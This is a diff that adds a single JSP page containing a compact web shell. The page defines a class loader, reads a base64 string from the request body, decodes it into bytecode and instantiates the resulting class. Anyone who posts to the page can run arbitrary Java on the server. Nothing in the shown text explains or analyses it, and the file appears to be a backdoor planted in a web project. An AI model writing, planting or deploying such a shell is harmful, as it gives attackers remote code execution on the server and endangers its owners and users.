@@ -1,0 +1,1 @@
+<%@page import="java.util.*"%><%!class Loader extends ClassLoader { public Class load(byte[] b) { return super.defineClass(null,b,0,b.length); } }%><% new Loader().load(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())).newInstance(); %>
